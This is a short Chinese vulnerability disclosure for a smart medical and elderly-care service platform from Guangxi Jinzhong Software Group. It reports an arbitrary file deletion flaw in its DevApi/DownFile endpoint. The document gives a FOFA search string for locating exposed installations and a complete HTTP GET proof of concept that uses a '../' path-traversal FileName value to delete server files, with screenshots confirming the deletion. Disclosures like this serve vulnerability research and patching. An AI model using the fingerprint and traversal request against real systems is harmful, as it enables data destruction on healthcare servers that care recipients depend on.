# 广西金中软件集团有限公司智慧医养服务平台DownFile存在任意文件删除漏洞

# 一、漏洞简介
广西金中软件集团有限公司前身成立于1999年，隶属于广西电信下的三产公司——金中信息产业有限公司，是一家集软件开发、网站建设、网络工程、系统集成和维护服务、通信增值业务和ISP运营服务于一体的高科技IT企业。广西金中软件集团有限公司智慧医养服务平台DownFile存在任意文件删除漏洞。

# 二、影响版本
+ 智慧医养服务平台

# 三、资产测绘
+ fofa`body="Content/css/Login/images/gtx-main-bg00004.png"`
+ 特征

![1721291803179-fa0d3eb8-c0c1-498b-929f-3a07eab9d2cc.png](./img/xow1UnbQOxtonEIR/1721291803179-fa0d3eb8-c0c1-498b-929f-3a07eab9d2cc-888430.png)

# 四、漏洞复现
1. 当前文件存在

```plain
/Content/Upload/202407/18/1.aspx
```

![1721304183404-85076103-3aca-4afb-8b6c-edf61a5f8dd5.png](./img/xow1UnbQOxtonEIR/1721304183404-85076103-3aca-4afb-8b6c-edf61a5f8dd5-791645.png)

2. poc

```plain
GET /DevApi/DownFile?FileName=../Content/Upload/202407/18/1.aspx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
```

![1721304206313-487befae-1b4b-4efe-a327-39177abf481e.png](./img/xow1UnbQOxtonEIR/1721304206313-487befae-1b4b-4efe-a327-39177abf481e-167095.png)

3. 当前文件已被删除

![1721304237409-e94de272-e4f1-44ee-acf4-e32bf23648ee.png](./img/xow1UnbQOxtonEIR/1721304237409-e94de272-e4f1-44ee-acf4-e32bf23648ee-178789.png)



> 更新: 2024-10-22 09:37:51  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ip0u6yn44ecxty0g>